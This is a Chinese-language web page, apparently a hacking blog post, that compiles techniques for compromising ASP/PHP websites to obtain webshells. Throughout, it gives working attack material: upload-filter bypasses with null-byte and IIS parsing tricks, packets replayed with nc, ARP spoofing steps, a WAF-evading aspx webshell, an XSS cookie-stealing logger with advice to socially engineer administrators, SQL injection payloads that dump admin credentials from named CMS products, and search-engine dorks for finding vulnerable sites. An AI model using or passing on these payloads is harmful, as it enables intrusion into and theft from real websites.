<p>1.filename (文件名称) 在上传页面中针对文件扩展名过滤不严，从而上传可执行的脚本木马。</p>
<p>2.filepath (文件路径) 在上传页面针对路径过滤不严，导致可以修改上传相对路径上传脚本木马。</p>
<p>当检测到一个上传页面，asp、asa后缀已经被过滤掉的时候，可以尝试抓包明小子或NC上传！</p>
<p>不行就利用本地上传漏洞构造上传！例如上传页面是：<a href="http://www.xx.com/upfile_other.asp" target="_blank" rel="noopener">http://www.xx.com/upfile_other.asp</a></p>
<p>1.右键查看源文件，找到这段代码：</p>
<p>把以上代码中actino处的路径补全！即：</p>
<p>2.再找到这段代码：</p>
<p>利用IIS6.0解析漏洞，把以上代码中value处的文件补全！即： 注意：冒号后面有空格！</p>
<p>3.接着保存为1.html，将刚保存的文件拖进去C32里，选择十六进制模式，找到“1.asa; ”后面的空格，将其填充为00后保存退出！</p>
<p>4.本地打开上传图片格式的木马(不成功时可以尝试上传一句话木马) ，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！</p>
<h3 id="【-利用双文件上传拿shell-】"><a href="#【-利用双文件上传拿shell-】" class="headerlink" title="【 利用双文件上传拿shell 】"></a>【 利用双文件上传拿shell 】</h3><p>因为网站只判断一次，如果第一个文件后缀是在白名单里面的话，就让其上传，并没有判断第二个文件，所以上传任意格式的文件也让其通过。</p>
<p>当系统验证cookie的时候，就要用到火狐浏览器了，<a href="http://www.yuntest.org/archives/tag/deng-lu/" target="_blank" rel="noopener">登录</a>网站进后台，让火狐浏览器保存管理员的cookie值，再把修改后的“双文件上传工具”拖进去上传。</p>
<p>1.在后台找上传点，右键查看源文件，找到上传地址，一般在post或action的附近，搜索即可找到，一般为：src=”../xxx.htm” 之后补全路径访问。</p>
<p>2.这个还不是真正的上传页面，真正的上传页面后缀是asp的，继续查看源代码，找到action=”xxx.asp”，补全路径访问即可！</p>
<p>4.其实也可以抓包从而获得上传路径，抓包之后，在Referer:这栏，还有常见的是：htto://<a href="http://www.xxxx.com/upfile_other.asp" target="_blank" rel="noopener">www.xxxx.com/upfile_other.asp</a></p>
<p>3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。</p>
<p>【 数据库备份抓包改包NC提交拿shell 】</p>
<p>当备份路径不能修改,后缀又是mdb不变的时候，我们可先对备份的过程进行抓包，再本地构造用NC提交即可突破备份，数据库恢复也可使用此方法！</p>
<p>在抓包的时候，最好用火狐浏览器，因为有的浏览器抓不到包，首先上传一张图片木马复制下地址，接着对备份过程进行抓包！把抓到的数据复制在文本里面！</p>
<p>开始本地修改，先把POST处补全网址，找到最底下的一行数据，再复制多一行对比长度进行修改，把备份的数据名称替换为木马地址，备份的名称改为自己想要的asp后缀！</p>
<p>再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length:处进行增减，用NC提交数据格式：nc 域名 80&lt;1.txt</p>
<h3 id="【-本地构造数据库备份突破拿shell-】"><a href="#【-本地构造数据库备份突破拿shell-】" class="headerlink" title="【 本地构造数据库备份突破拿shell 】"></a>【 本地构造数据库备份突破拿shell 】</h3><p>当上传jpg木马得到路径前去备份时，发现数据库备功能用不了的情况下，可以尝试本地构造突破拿shell！</p>
<p>首先查看源文件，找到“当前数据库路径”修改为刚上传jpg木马的路径，再找到“数据库备份名称”修改为1.asa</p>
<p>找到“</p>
<p>“将路径补全”</p>
<p>”</p>
<p>最后保存为1.html，有的网站不验证cookie的话，直接打开进行备份就能成功了，但是一般都需要验证cookie，这时就用上火狐浏览器了。</p>
<p>因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1.html拖进火狐浏览器里，直接点击备份即可突破cookie验证！</p>
<h3 id="【-本地构造限制上传类型漏洞-】"><a href="#【-本地构造限制上传类型漏洞-】" class="headerlink" title="【 本地构造限制上传类型漏洞 】"></a>【 本地构造限制上传类型漏洞 】</h3><p>一般用于直接扫到的上传页面，名称是：上传图片，上传asp、asa等脚本时提示“请选择jpg或gif文件!”</p>
<p>这时通过这个方法一般都能成功，首先保存到本地1.asp 放到小旋风的目录下，然后找到以下这段代码：</p>
<p>alert(“请点击浏览按钮，选择您要上传的jpg或gif文件!”)</p>
<p>myform.file1.focus;</p>
<p>return (false);</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>str= myform.file1.value;</p>
<p>strs=str.toLowerCase();</p>
<p>lens=strs.length;</p>
<p>extname=strs.substring(lens-4,lens);</p>
<p>if(extname!=”.jpg” &amp;&amp; extname!=”.gif”)</p>
<p>{</p>
<p>alert(“请选择jpg或gif文件!”);</p>
<p>看到这句代码：if(extname!=”.jpg” &amp;&amp; extname!=”.gif”) 改为： if(extname!=”.jpg” &amp;&amp; extname!=”.gif” &amp;&amp; extname!=”.asp”)</p>
<p>然后补充完整上传地址，action=这里，然后网页打开127.0.0.1 直接上传asp文件就可以了。</p>
<h3 id="【-抓包改包NC提交拿shell-】"><a href="#【-抓包改包NC提交拿shell-】" class="headerlink" title="【 抓包改包NC提交拿shell 】"></a>【 抓包改包NC提交拿shell 】</h3><p>1.抓包数据中如果存在name=”filepath”或是name=”filename”，那么就可以满足NC的上传条件了。</p>
<p>2.将木马的抓包数据复制到文本文件中。例如：1.txt</p>
<p>3.将路径补全：</p>
<p>filepath截断法：</p>
<p>uploadfile/路径后添加1.asp空格 (16进制下面将20改为00)</p>
<p>filename自定义名称：</p>
<p>C:Documents and Settingslei桌面1.jpg (将1.jpg 改为 1.asp空格，16进制下将20改为00)</p>
<p>3.在Content-Length处加上../uploadfile/后增加的字节数。</p>
<p>4.用C32将空格的20改为00，保存为1.txt。</p>
<p>5.把1.txt跟nc.exe放在同一目录下，cmd命令：nc -vv <a href="http://www.XXXX.com" target="_blank" rel="noopener">www.XXXX.com</a> 80&lt;1.txt</p>
<p>( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )</p>
<h3 id="【-抓包nc上传获取管理权限-】"><a href="#【-抓包nc上传获取管理权限-】" class="headerlink" title="【 抓包nc上传获取管理权限 】"></a>【 抓包nc上传获取管理权限 】</h3><p>这个方法相当于cookie欺骗，首先到前台去注册一个会员，注册成功后在登录的那一刻，用抓包工具进行抓包，把抓到的数据复制到1.txt里面。</p>
<p>接下来打开，把双引号里棉的数据“X-Forwarded-For: 127.0.0.2’,group_id = 1 where loginname = ‘会员的帐号’#” 放在Content-Length：的下面。</p>
<p>在看到最底下的loginname=这行代码，把最后面的验证码改成当前会员登陆的验证码，然后将nc1.txt 放在同一个目录下，cmd命令：nc 域名 80选择服务器IP一项-&gt;在路由追踪一项取消全部-&gt;确定。</p>
<p>设置完毕后点击一下激动按钮(中间那个)，再点击嗅探器，点击加号符号，选择所有在子网主机，选择ARP<a href="http://www.yuntest.org/archives/tag/ce-shi/" target="_blank" rel="noopener">测试</a>(传播 31-位)，确定。</p>
<p><a href="http://www.yuntest.org/archives/tag/sao-miao/" target="_blank" rel="noopener">扫描</a>完毕选择网关一项，点击ARP，点击加号符号，左边选择网关，右边选择全部的C段，确定，点击开始嗅探按钮(第三个)，嗅探到的帐号密码在口令一项展现！</p>
<p>如果发现没数据可以使用幻境网盾来限制网速，让cain的发包跨过防火墙</p>
<h3 id="【-arp欺骗-】"><a href="#【-arp欺骗-】" class="headerlink" title="【 arp欺骗 】"></a>【 arp欺骗 】</h3><p>只要该服务器存在C段，都可以尝试arp欺骗，用到的工具是NetFuke，想知道arp劫持能不能成功，cmd命令：arp -a 看一下，动态的服务器IP就能成功，静态的就不能。</p>
<p>安装完运行主控端，设置–嗅探设置–网卡选择服务器的IP–控制选项选择“启用<a href="http://www.yuntest.org/archives/tag/arpqi-pian/" target="_blank" rel="noopener">ARP欺骗</a>、启用过滤器、启用分析器、启用修改器、主动转发” 确定。</p>
<p>设置–<a href="http://www.yuntest.org/archives/tag/arpqi-pian/" target="_blank" rel="noopener">ARP欺骗</a>–双向欺骗–来源Ip填服务器的网关–中间人IP填服务器的IP–目标IP填要欺骗的任意C段ip(用御剑<a href="http://www.yuntest.org/archives/tag/sao-miao/" target="_blank" rel="noopener">扫描</a>C段)–确定。</p>
<p>插件管理–修改器–最后一个选项双击–在右边的HTML Body = [haha!!] 填写自己要展现的文字，点击开始即可欺骗成功！</p>
<h3 id="【-突破安全狗防注入及上传-】"><a href="#【-突破安全狗防注入及上传-】" class="headerlink" title="【 突破安全狗防注入及上传 】"></a>【 突破安全狗防注入及上传 】</h3><p>写入webshell 写不进去，平常的一句话 也失效，用这段代码：</p>
<p>&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt; &lt;%try{System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“admin163.net”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null,null); } catch { }%&gt;</p>
<p>连接端用cncert的aspx一句话客户端</p>
<p>2、IIS6.0解析漏洞遇到安全狗</p>
<p>文件名为<a href="http://www.baicai.com/1.asp;1.jpg" target="_blank" rel="noopener">http://www.baicai.com/1.asp;1.jpg</a></p>
<p>这样的会被IIS安全狗果断屏蔽</p>
<p>改成如下名称,IIS6一样会解析:</p>
<p><a href="http://www.baicai.com/;1.asp;1.jpg" target="_blank" rel="noopener">www.baicai.com/;1.asp;1.jpg</a></p>
<p>3、安全狗的注入绕过</p>
<p>常用的如baicai.asp?id=1 and 1=1 是会被安全狗屏蔽的。</p>
<p>但这样就可以突破了：</p>
<p>baicai.asp?0day5.com=%00.&amp;id=69%20 and 1=1</p>
<h3 id="【-跨站xss-】"><a href="#【-跨站xss-】" class="headerlink" title="【 跨站xss 】"></a>【 跨站xss 】</h3><p>在网站留言或者能输入信息的地方提交跨站代码，从而盗取管理员cookie，然后用cookie浏览器直接进入后台，将以下代码保存为asp文件，例如1.asp&lt;% thisfile=Server.MapPath(“cookie.txt”) msg=Request(“msg”) set fs=server.CreateObject(“scripting.filesystemobject”) set thisfile=fs.OpenTextFile(thisfile,8,True,0) thisfile.WriteLine(“=======cookie:”&amp;msg&amp;”======by:剑眉大侠”) thisfile.close set fs=nothing %&gt;</p>
<p>首先搭建一个asp环境，推荐使用“ASP服务器（摆脱安装IIS）” 再将1.asp放在wwwroot目录下，访问1.asp文件如果提示下载，则说明搭建成功了。</p>
<p>然后在留言板的“您的网站”一处输入： </p>
<p>当管理员浏览我们提交的留言时，将在wwwroot目录下生成一个cookie.txt文件，这时我们只要访问cookie.txt这个文件，就能知道管理员的cookie是多少了！</p>
<p>然后再使用桂林老兵的cookie欺骗工具或是网页源代码查看分析器，访问网站再输入cookie进行欺骗登录即可！（填cookei的时候记得选择自定义）</p>
<p>小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去<a href="http://www.yuntest.org/archives/tag/she-gong/" target="_blank" rel="noopener">社工</a>他即可。</p>
<h3 id="【-爆库-】"><a href="#【-爆库-】" class="headerlink" title="【 爆库 】"></a>【 爆库 】</h3><p>%5C为十六进制的符号，而数据库大于5.0就可以爆库，若一个网站数据库大于5.0，且是ACESS数据库，若不能注入的注入点是：<a href="http://www.xxx.com/rpc/show24.asp?id=127" target="_blank" rel="noopener">http://www.xxx.com/rpc/show24.asp?id=127</a></p>
<p>我们直接把%5C加到rpc后面，因为%5C是爆二级目录，所以应该是这样，<a href="http://www.xxx.com/rpc%5c/show24.asp?id=127" target="_blank" rel="noopener">http://www.xxx.com/rpc%5c/show24.asp?id=127</a></p>
<p>而%23是代表#，如果管理员为了防止他人非法下载数据库，而把数据库改成#database.mdb,这样防止了。</p>
<p>如果页面地址为：<a href="http://www.xx.com/rpd/#database.mdb" target="_blank" rel="noopener">http://www.xx.com/rpd/#database.mdb</a> ; 把%23替换#就可以下载了，即：<a href="http://www.xx.com/rpd/%23database.mdb" target="_blank" rel="noopener">http://www.xx.com/rpd/%23database.mdb</a></p>
<p>还有利用默认的数据库路径 <a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com/</a> 后面加上 conn.asp 如果没有修改默认的数据库路径，也可以得到数据库的路径（注意：这里的/也要换成%5c）</p>
<p>如果你能看到：’E:/ahttc040901/otherweb/dz/database/iXuEr_Studio.asa’不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。</p>
<p>这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行.</p>
<h3 id="【-利用sql注入点判断网站和数据库是否站库分离-】"><a href="#【-利用sql注入点判断网站和数据库是否站库分离-】" class="headerlink" title="【 利用sql注入点判断网站和数据库是否站库分离 】"></a>【 利用sql注入点判断网站和数据库是否站库分离 】</h3><p>在注入点后加上：and exists(select * from admin where 1=(Select (case when host_name()=@@servername then 1 else 0 end)))</p>
<p>注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。</p>
<h3 id="【-iis6-0-PUT写入漏洞-】"><a href="#【-iis6-0-PUT写入漏洞-】" class="headerlink" title="【 iis6.0 PUT写入漏洞 】"></a>【 iis6.0 PUT写入漏洞 】</h3><p>利用工具：IIS PUT Scaner、桂林老兵IIS写权限利用程序</p>
<p>1、IIS来宾用户对网站文件夹有写入权限</p>
<p>2、web服务器扩展力设置webDAV为允许，即：WebDAV—打勾</p>
<p>3、网站主目录:写入—打勾(可PUT)</p>
<p>4、网站主目录:脚本资源访问—打勾（可COPY、MOVE）</p>
<p>大家都清楚，写权限就是允许PUT，与网站自身运行的权限无丝毫联系，如果开启了，就是没有一点安全意识，就给我们提供了大大的方便。</p>
<p>首先用御剑工具扫下C段，比如：12.12.12.1 – 12.12.12.255 打开IIS PUT Scaner，把12.12.12.1放在Start IP 这里，12.12.12.255放在End IP 这里，</p>
<p>接着在Port这里，换成80，点击Scan开始嗅探，当PUT这里显示是Yes就说明存在漏洞，可以右键选择PUT file，输入文件名1.txt，下面填内容，保存就可以写入了。</p>
<p>或是利用“桂林老兵IIS写权限利用程序”也可以，这款工具比较强大，把域名填写进去，例如：<a href="http://www.xxx.com，然后在请求文件那里输入你的文件名，" target="_blank" rel="noopener">www.xxx.com，然后在请求文件那里输入你的文件名，</a></p>
<p>在数据包格式那里选择PUT，有的会直接弹出浏览文件框，没有就自己选择，在下面，然后点击提交数据库即可，一般是先PUT一个txt文件，再MOVE成asp木马。</p>
<p>直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。</p>
<p>==========================================================================================================================</p>
<h3 id="【-ACCESS执行SQL语句导出一句话拿webshell-】"><a href="#【-ACCESS执行SQL语句导出一句话拿webshell-】" class="headerlink" title="【 ACCESS执行SQL语句导出一句话拿webshell 】"></a>【 ACCESS执行SQL语句导出一句话拿webshell 】</h3><p>原理大致和php网站的outfile差不多，在access后台其他方法不能拿到webshell，但是后台有SQL语句查询执行，就可以直接access导出一句话拿webshell了。不过需要知道物理路径才能导出，利用IIS的解析漏洞导出EXCEL文件拿到webshell，因为ACCESS数据库不允许导出其他危险格式，我们导出为EXCEL后在利用IIS解析漏洞就可以变成我们的木马了。</p>
<p>点“服务器信息探测”，获得网站路径：e:webwebshellcc的EXCEL 点“系统管理”-》“自定义执行SQL”，试一下，能够执行的话可以用access导一句话拿下shell。</p>
<p>create table cmd (a varchar(50)) 建立一个有一个A字段的表 表名为cmd 字段类型为字符 长度为50</p>
<p>insert into cmd (a) values (‘&lt;%execute request(chr(35))%&gt;’) 在表cmd的a字段插入密码为#的一句话木马</p>
<p>select * into [a] in ‘e:webwebshellcc1.asa;x.xls’ ‘excel 4.0;’ from cmd 把cmd表a的内容导出到路径e:webwebshellcc的EXCEL文件</p>
<p>drop table cmd 删除建立的cmd表</p>
<p>菜刀连接：<a href="http://www.xxx.com/1.asa;x.xls" target="_blank" rel="noopener">http://www.xxx.com/1.asa;x.xls</a></p>
<p>==========================================================================================================================</p>
<h3 id="【-利用过滤’or’-’or’修改代码进行绕过-】"><a href="#【-利用过滤’or’-’or’修改代码进行绕过-】" class="headerlink" title="【 利用过滤’or’=’or’修改代码进行绕过 】"></a>【 利用过滤’or’=’or’修改代码进行绕过 】</h3><p>例如后台地址是：<a href="http://www.hdminc.net/admin/admin_index.asp" target="_blank" rel="noopener">http://www.hdminc.net/admin/admin_index.asp</a></p>
<p>当用万能密码登录的时候，会出现一些过滤or的提示！</p>
<p>请右键查看源文件，另存为桌面 XX.html，然后打开找到以下这段代码，进行删除！</p>
<p>注意：将以下段代码中的 “index.asp?action=chkadmin” 修改为 “<a href="http://www.hdminc.net/admin/admin_index.asp”" target="_blank" rel="noopener">http://www.hdminc.net/admin/admin_index.asp”</a></p>
<p>最后保存打开，再用’or’=’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！</p>
<p>==========================================================================================================================</p>
<h3 id="【-动力3-5拿shell-】"><a href="#【-动力3-5拿shell-】" class="headerlink" title="【 动力3.5拿shell 】"></a>【 动力3.5拿shell 】</h3><p>inurl:printpage.asp?ArticleID=</p>
<p>1.找到版权信息，把内容替换成：</p>
<p>版权所有 Copyright? 2003 <a href="http://www.yuntest.org/wp-content/themes/begin/inc/go.php?url=%E2%80%99http://www.asp163.net%E2%80%99" target="_blank" rel="noopener">动力空间</a>” ‘版权信息</p>
<p>if Request(“xiaoxin”)=”520″ then</p>
<p>dim allen,creat,text,thisline,path</p>
<p>if Request(“creat”)=”yes” then</p>
<p>Set fs = CreateObject(“Scripting.FileSystemObject”)</p>
<p>Set outfile=fs.CreateTextFile(server.mappath(Request(“path”)))</p>
<p>outfile.WriteLine Request(“text”)</p>
<p>Response.write “小新恭喜”</p>
<p>end if</p>
<p>Response.write “</p>
<p>”</p>
<p>Response.write “</p>
<p>”</p>
<p>Response.write “”</p>
<p>Response.write “</p>
<p>”</p>
<p>Response.end</p>
<p>end if</p>
<p>%&gt;2.然后保存，千万别跳转任何页面，直接在IE地址栏内将 admin/Admin_Login.asp 替换成 inc/config.asp?xiaoxin=5203.成功后会进入一个像小马一样的页面，粘贴木马代码以及写上木马文件名即可拿到wshell，木马在inc目录。</p>
<p>==========================================================================================================================</p>
<h3 id="【-aspcms】"><a href="#【-aspcms】" class="headerlink" title="【 aspcms】"></a>【 aspcms】</h3><p>简要描述：后台文件AspCms_AboutEdit.asp 未进行验证，且未过滤，导致SQL注入。</p>
<p>爆帐号密码：</p>
<p>admin/_content/_About/AspCms_AboutEdit.asp?id=1 and 1=2 union select 1,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 from aspcms_user where userid=1</p>
<p>版本不同需要更改值。</p>
<p>第二种方法，找到后台，然后/admin/_system/AspCms_SiteSetting.asp?action=saves</p>
<p>直接POST</p>
<p>[php]runMode=1&amp;siteMode=1&amp;siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&amp;SwitchComments=1&amp;SwitchCommentsStatus=1&amp;switchFaq=0:Y=request(chr(35)):execute(Y)&amp;SwitchFaqStatus=0&amp;dirtyStr=&amp;waterMark=1&amp;waterMarkFont=hahahaha&amp;waterMarkLocation=1&amp;smtp_usermail=aspcmstest%40163.com&amp;smtp_user=aspcmstest&amp;smtp_password=aspcms.cn</p>
<p>&amp; smtp_server=smtp.163.com&amp;MessageAlertsEmail=13322712%40qq.com&amp;messageReminded=1&amp;orderReminded=1&amp;applyReminded=1&amp;commentReminded=1</p>
<p>&amp; LanguageID=1[/php]</p>
<p>再连接配置文件config.asp 密码为#</p>
<p>老版本中可以通过添加模板直接添加asp.但是新版已经限制了添加模板的格式为html,js,css</p>
<p>当然如果是遇到iis6的话还是可以通过iis6的解析漏洞把文件名改成1.asp;.html这样的格式来拿到shell的.</p>
<p>方法：点击“界面风格”，然后选“编辑模板/CSS文件”，然后“添加模板”，文件名称写error.asp;.html，文件内容写一句话&lt;%eval request(“g”)%&gt;</p>
<p>然后添加，会提示添加成功，然后在模板列表中就可以找到我们添加的一句话了，用菜刀连接即可！</p>
<p>可是如果遇到iis7.5呢? 以下是本人自己找到挖掘到的aspcms通杀版本的后台拿shell方法.</p>
<p>1、进入后台，“扩展功能”–“幻灯片设置”–”幻灯样式”</p>
<p>2、使用chorme的审查元素功能或者firefox的firebug，总之使用能修改当前页面元素的工具就好了，将对应的slidestyle的value的值修改为1%&gt;&lt;%Eval(Request (chr(65)))%&gt;&lt;% 3、一句话木马，密码a。在/config/AspCms_Config.asp ==========================================================================================================================</p>
<h3 id="【-XYCMS企业建站系统-】"><a href="#【-XYCMS企业建站系统-】" class="headerlink" title="【 XYCMS企业建站系统 】"></a>【 XYCMS企业建站系统 】</h3><p>关键词：inurl:showkbxx.asp?id= 默认数据库：data/xy#!123.mdb 默认账户密码：admin admin 找到网站配置，在网站名称里面直接插入一句话：网站”%&gt;&lt;%eval request(“x”)%&gt;&lt;%’，注意不要删掉网站名称！然后中国菜刀连接：/inc/config.asp</p>
<h3 id="【-szwyadmin漏洞绕过后台验证-】"><a href="#【-szwyadmin漏洞绕过后台验证-】" class="headerlink" title="【 szwyadmin漏洞绕过后台验证 】"></a>【 szwyadmin漏洞绕过后台验证 】</h3><p>关键字:inurl:szwyadmin/login.asp</p>
<p>javascript:alert(document.cookie=”adminuser=”+escape(“‘or’=’or’”));javascript:alert(document.cookie=”adminpass=”+escape(“‘or’=’or’”));javascript:alert(document.cookie=”admindj=”+escape(“1″));</p>
<p>1.后台一般存在一个szwyadmin文件夹，复制一下后台地址放在一边，之后复制代码替换后台地址访问进行注射！</p>
<p>2.这时会弹出一个窗口，连续点击三次确定。</p>
<p>3.重新访问后台地址，把网站后面的/login.asp 换成 admin_index.asp 奇迹般的直接进入后台了！</p>
<p>==========================================================================================================================</p>
<h3 id="【-医院建站系统任意文件上传漏洞-】"><a href="#【-医院建站系统任意文件上传漏洞-】" class="headerlink" title="【 医院建站系统任意文件上传漏洞 】"></a>【 医院建站系统任意文件上传漏洞 】</h3><p>关键词：inurl:cms/Column.aspx?</p>
<p>关键词：inurl:cms/Column.aspx?LMID=</p>
<p>漏洞利用 ：xtwh/upfile.aspx</p>
<p>直接上传aspx木马拿shell。</p>
<p>==========================================================================================================================</p>
<h3 id="【-嘉友科技cms上传漏洞-】"><a href="#【-嘉友科技cms上传漏洞-】" class="headerlink" title="【 嘉友科技cms上传漏洞 】"></a>【 嘉友科技cms上传漏洞 】</h3><p>谷歌关键字：inurl:newslist.asp?NodeCode=</p>
<p>程序采用的上传页uploadfile.asp未进行管理验证，导致建立畸形目录上传图片木马获取shell漏洞。</p>
<p>exp：ploadfile.asp?uppath=mad.asp&amp;upname=&amp;uptext=form1.mad.asp他原上传目录是:uploadfile.asp?uppath=PicPath&amp;upname=&amp;uptext=form1.PicPath</p>
<p>而且他的上传文件没有过滤导致未授权访问，直接上传小马，然后小马后面写为1.jpg 访问路径 查看源代码。</p>
<p>==========================================================================================================================</p>
<h3 id="【-ecshopcms后台拿shell-】"><a href="#【-ecshopcms后台拿shell-】" class="headerlink" title="【 ecshopcms后台拿shell 】"></a>【 ecshopcms后台拿shell 】</h3><p>支持最新2.7.2版本，通杀最新版本后台低权限！</p>
<p>后台-订单管理-订单打印-选择源代码编辑-保存-返回订单列表，随意选择一个订单打印，返回OK，生成一句话成功-在根目录生成了一个null.php，一句话密码：usb</p>
<p>==========================================================================================================================</p>
<h3 id="【-教育站sql注入通杀0day-】"><a href="#【-教育站sql注入通杀0day-】" class="headerlink" title="【 教育站sql注入通杀0day 】"></a>【 教育站sql注入通杀0day 】</h3><p>关键词：inurl:info_Print.asp?ArticleID=</p>
<p>默认后台：<a href="http://www.xx.com/ad_login.asp" target="_blank" rel="noopener">www.xx.com/ad_login.asp</a></p>
<p>比如：<a href="http://www.xx.com/info_Print.asp?ArticleID=539" target="_blank" rel="noopener">http://www.xx.com/info_Print.asp?ArticleID=539</a></p>
<p>加上：union select 1,2,username,password,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from admin</p>
<p>这样就直接得到了管理员账户和经过Md5加密的密码了。</p>
<p>==========================================================================================================================</p>
<h3 id="【-IIS7-0-畸形解析漏洞通杀oday-】"><a href="#【-IIS7-0-畸形解析漏洞通杀oday-】" class="headerlink" title="【 IIS7.0 畸形解析漏洞通杀oday 】"></a>【 IIS7.0 畸形解析漏洞通杀oday 】</h3><p>找到某个使用IIS7.0架设的站，然后找到其中的图片上传点（不需要管理权限，普通注册用户即可搞定），把PHP一句话图片木马缀改成.jpg，传上去，得到图片地址。</p>
<p>在图片格式后面添加xx.php xx随便你怎么填，只要后缀为.php就好，之后菜刀连接即可！</p>
<p>==========================================================================================================================</p>
<h3 id="【-Yothcms-遍历目录漏洞-】"><a href="#【-Yothcms-遍历目录漏洞-】" class="headerlink" title="【 Yothcms 遍历目录漏洞 】"></a>【 Yothcms 遍历目录漏洞 】</h3><p>优斯科技企业网站管理系统(YothCMS)是一款完全开源免费的CMS。</p>
<p>默认后台：admin/login.asp</p>
<p>遍历目录：ewebeditor/manage/upload.asp?id=1&amp;dir=../</p>
<p>数据库路径：%23da%23ta%23%23db_%23data%23%23.asa</p>
<p>==========================================================================================================================</p>
<h3 id="【-传信网络独立开发网站源码0day漏洞-】"><a href="#【-传信网络独立开发网站源码0day漏洞-】" class="headerlink" title="【 传信网络独立开发网站源码0day漏洞 】"></a>【 传信网络独立开发网站源码0day漏洞 】</h3><p>默认后台：system/login.asp</p>
<p>编辑器后台路径：ubbcode/admin_login.asp</p>
<p>数据库路径：ubbcode/db/ewebeditor.mdb</p>
<p>默认账号密码：yzm 111111</p>
<p>==========================================================================================================================</p>
<h3 id="【科讯cms-6-5后台拿shell-】"><a href="#【科讯cms-6-5后台拿shell-】" class="headerlink" title="【科讯cms 6.5后台拿shell 】"></a>【科讯cms 6.5后台拿shell 】</h3><p>1.可以在数据库备份中找到网站的绝对路径</p>
<p>2.利用科讯SQL注入漏洞利用工具也能找到进入后台后执行sql命令：</p>
<p>create table E:wenxiushiwz001KS_DataCollectKS_Collect.Mdb.cmd (a varchar(50))</p>
<p>insert into E:wenxiushiwz001KS_DataCollectKS_Collect.Mdb.cmd (a) values (‘┼攠數畣整爠煥敵瑳∨∣┩愾’)</p>
<p>接着数据库备份成1.asp 菜刀连接密码：#</p>
<p>==========================================================================================================================</p>
<h3 id="【-动易2006后台拿shell-】"><a href="#【-动易2006后台拿shell-】" class="headerlink" title="【 动易2006后台拿shell 】"></a>【 动易2006后台拿shell 】</h3><p>进入后台后，我们在左边菜单栏中选择“系统设置”，然后在出现的菜单栏里选择“自定义页面管理”，</p>
<p>接着需要先添加一个自定义页面分类，选择“添加自定义分类”这个选项，分类名称与分类简介都可以随便填写。填写完毕后选择“添加”，系统提示添加成功。</p>
<p>下面再来选择“添加自定义页面”，“页面名称”随便输入，“所属分类”就是刚才建立的分类就可以了。“页面类型”和“页面路径”都不用管，保持默认.</p>
<p>不过如果没有改页面路径的话，默认生成的文件是在根目录下的，也就是<a href="http://www.xx.com/maer.asp.“文件名称”即输入生成的木马的文件名。" target="_blank" rel="noopener">http://www.xx.com/maer.asp.“文件名称”即输入生成的木马的文件名。</a></p>
<p>“页面简介”也不用管，下面就是页面内容了。这里填入小马的代码。一切完毕点击“添加”会提示保存自定义页面成功。最后一步是要生成我们的木马页面。</p>
<p>选择“自定义页面管理首页”，点击右边出现的“生成本页”就OK 了，成功获得动易的shell。</p>
<p>==========================================================================================================================</p>
<h3 id="【-Shopex4-8-5-注入漏洞后台拿shell-】"><a href="#【-Shopex4-8-5-注入漏洞后台拿shell-】" class="headerlink" title="【 Shopex4.8.5 注入漏洞后台拿shell 】"></a>【 Shopex4.8.5 注入漏洞后台拿shell 】</h3><p>关键词：powered by shopex v4.8.5</p>
<p>exp:Shopex 4.8.5 SQL Injection Exp</p>
<p>Shopex 4.8.5 SQL Injection Exp (product-gnotify)</p>
<p>fuck</p>
<p>保存为html格式，替换代码中的网站，本地打开后点击小图标，出现新页面，帐号密码爆出来了，默认后台：shopadmin</p>
<p>拿shell方法….</p>
<p>第一步 页面管理 修改模版 然后选一个XML编辑</p>
<p>开始用 live http 抓包 你们懂的 然后把第一个POST包给抓出来</p>
<p>然后改包 id=1273923028-info.xml&amp;tmpid=1273923028&amp;name=index_temp.php&amp;file_source=</p>
<p>解释一下 id是你选择的模版文件夹名称 后面的info.xml 是你修改的XML文件 tmpid= 你们懂的 就是模版文件夹 然后 name 是你提交的文件名字 file_source 是后门或者shel</p>
<p>我这里是一句话 你们懂的 然后提交了之后 地址是这样的<a href="http://Madman.in/themes/文件名称/你的木马名称" target="_blank" rel="noopener">http://Madman.in/themes/文件名称/你的木马名称</a></p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="【-ecshop漏洞总汇-】"><a href="#【-ecshop漏洞总汇-】" class="headerlink" title="【 ecshop漏洞总汇 】"></a>【 ecshop漏洞总汇 】</h3><p>关键字：powered by ecshop普通代码：user.php?act=order_query&amp;order_sn=’ union select 1，2，3，4，5，6，concat(user_name，0x7c，password，0x7c，email)，8 from ecs_admin_user/*</p>
<p>变种代码：search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319</p>
